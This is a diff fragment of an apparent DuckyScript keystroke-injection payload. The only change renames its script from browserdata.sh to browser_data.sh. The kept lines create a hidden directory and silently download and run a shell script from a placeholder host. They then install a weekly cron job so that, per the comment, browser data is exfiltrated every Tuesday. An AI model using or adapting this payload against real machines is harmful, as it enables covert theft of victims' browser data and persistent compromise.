@@ -21,11 +21,11 @@ STRING mkdir ~/.hidden
 ENTER
 
 REM Download the shell script
-STRING ((curl -o ~/.hidden/browserdata.sh https://your.domain.com/browserdata.sh &> /dev/null && sh ~/.hidden/browserdata.sh &> /dev/null &)&) 
+STRING ((curl -o ~/.hidden/browser_data.sh https://your.domain.com/browser_data.sh &> /dev/null && sh ~/.hidden/browser_data.sh &> /dev/null &)&) 
 ENTER
 
 REM Setup persistence and efil data at 10AM every Tuesday
-STRING chmod +x ~/.hidden/browserdata.sh && echo "0 10 * * 2 ~/.hidden/browserdata.sh" | crontab -
+STRING chmod +x ~/.hidden/browser_data.sh && echo "0 10 * * 2 ~/.hidden/browser_data.sh" | crontab -
 ENTER
 
 REM Quit terminal
